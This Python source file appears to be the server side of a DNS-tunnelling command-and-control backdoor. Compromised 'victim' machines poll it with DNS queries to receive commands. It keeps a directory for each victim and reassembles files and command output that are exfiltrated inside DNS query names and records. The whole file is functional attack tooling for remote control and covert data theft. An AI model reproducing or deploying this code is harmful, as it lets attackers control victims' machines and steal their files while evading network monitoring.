"""Process a given packet
"""
import os
import datetime

from scapy.all import *
from utils.request_type import RequestType
from utils.data_req_type import DataRequestType
from utils.mac import Mac
from command.cmdparser import CommandParser

class DataReceiver():

    def __init__(self, rel_path, cmd_file, queue, config):
        self.cmd_parser = CommandParser(config)
        self.rel_path = rel_path
        self.cmd_file = cmd_file
        self.queue = queue
        self.config = config

        self.file_transfer = dict()

    def parse(self, pkt):
        # Check qtype field to delineate type of given packet
        if pkt.getlayer(DNSQR).qtype == RequestType.PING:
            self._receive_ping(pkt)
        elif pkt.getlayer(DNSQR).qtype == RequestType.DATA:
            self._receive_data(pkt)
        elif pkt.getlayer(DNSQR).qtype == RequestType.RECPT:
            self._receive_recpt(pkt)

    def _receive_ping(self, pkt):
        """Handle when the client sends a request to ping the server for a command to run
        
        Arguments:
            pkt {Ether} -- packet sent from the client
        """

        # Fetch given command that should be sent to the client
        print('ping')
        victim_mac = Mac(pkt.getlayer(Ether).src)

        # Ignore broadcast since Ether() is sent as empty
        if str(victim_mac) == '00:00:00:00:00:00':
            return

        # If client connecting for first time, create new dir for it
        victim_dir = self.rel_path + str(victim_mac)
        if not os.path.exists(victim_dir):
            self._init_victim_dir(victim_dir)

        pkts = self.cmd_parser.parse(victim_mac, pkt, victim_dir, self.cmd_file)

        # Send packets back to victim
        for p in pkts:
            self.queue.enqueue(p)
        

    def _receive_data(self, pkt):
        """Handle processing data corresponding to file transfers
        
        Arguments:
            pkt {Ether} -- packet that was sent by the client
        """

        print('receive_data')
        victim_mac = Mac(pkt.getlayer(Ether).src)

        # Ignore broadcast since Ether() is sent as empty
        if str(victim_mac) == '00:00:00:00:00:00':
            return

        # Process packets
        dns_layer = pkt.getlayer(DNS)
        dnsqr_layer = pkt.getlayer(DNSQR)
        fields = dnsqr_layer.qname[:-1].split('.') # There is a trailing period
        filename = fields[-2] + '.' + fields[-1]
        key = str(victim_mac) + '@' + filename

        # Determine if it is a head, body, or tail packet
        if dnsqr_layer.qclass == DataRequestType.HEAD:
            # Create entry, parse DNSRR.rrname
            self.file_transfer[key] = ''
        elif dnsqr_layer.qclass == DataRequestType.NORMAL:
            dnsrr_layer = pkt.getlayer(DNSRR)
            data_fields = dnsrr_layer.rrname[:-1].split('.')
            buffer = ''
            for i in range(1, len(data_fields) - 3):
                buffer += data_fields[i]

            self.file_transfer[key] += buffer
        elif dnsqr_layer.qclass == DataRequestType.TAIL:
            # Write to file from buffer
            victim_dir = self.rel_path + str(victim_mac)
            with open(victim_dir + '/files/' + filename, 'w+') as f:
                f.write(self.file_transfer[key])


    def _receive_recpt(self, pkt):
        """Process RECPT request from the client and writes out result of command to file
        
        Arguments:
            pkt {Ether} -- packet sent from client
        """
        print('receipt')

        # Scapy concats the rdata together, even if it exceeds 255 bytes
        # test = pkt.getlayer(DNSRR)
        # print(test.rdata)

        # Create a new file with current timestamp with output of command
        victim_mac = Mac(pkt.getlayer(Ether).src)

        # Ignore broadcast since Ether() is sent as empty
        if str(victim_mac) == '00:00:00:00:00:00':
            return

        self._write_cmd_result(pkt, victim_mac)

    def _init_victim_dir(self, victim_dir):
        """Initializes the victim directory with directories for inputting commands, command outputs, and file outputs
        
        Arguments:
            victim_dir {[type]} -- [description]
        """
        os.mkdir(victim_dir)
        os.mkdir(victim_dir + '/input')
        os.mkdir(victim_dir + '/output')
        os.mkdir(victim_dir + '/files')

    def _write_cmd_result(self, pkt, victim_mac):
        """Writes resulting payload from packet to file
        """
        timestamp = datetime.now().isoformat()
        with open(self.rel_path + str(victim_mac) + '/output/' + timestamp + '.txt', 'w') as f:
            dnsrr_layer = pkt.getlayer(DNSRR)
            f.write(dnsrr_layer.rrname[:-1] + '\n') # Command associated with output
            f.write(dnsrr_layer.rdata)